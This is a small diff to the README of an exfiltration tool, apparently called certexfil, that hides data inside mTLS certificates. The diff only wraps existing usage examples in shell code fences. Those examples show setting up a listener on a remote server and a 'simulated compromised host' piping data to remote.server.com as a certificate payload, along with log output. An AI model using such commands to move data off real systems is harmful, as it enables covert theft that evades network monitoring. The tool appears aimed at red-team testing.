@@ -28,20 +28,22 @@ somewhere$ certexfil -ca -ecdsa-curve P521 --host remote.host.com
 ```
 
 Ensure the certexfil binary and ./CERTS directory are on your remote server. Then, initiate the mTLS listener:
-
+```shell
 remoteserver$ ./certexfil --listen
+```
 
 Client or Simulated Compromised Host
 
 Embedding output as a payload:
 
+```shell
 06:46:00 jma@wintermute Go-Workspace → echo 'w00t w00t' | certexfil --host remote.server.com  --payload -
 2019/05/31 18:48:27 [*] Reading from stdin..
 2019/05/31 18:48:27 [D] Payload (raw)  --> w00t w00t...	(9 bytes)
 2019/05/31 18:48:27 [D] Payload (Prepare()) --> �...		(31 bytes)
 2019/05/31 18:48:27 [*] Generated custom cert with payload
 Oo
-
+```
 This format should make it easier to use as a README or other documentation.
 
 ## Contact
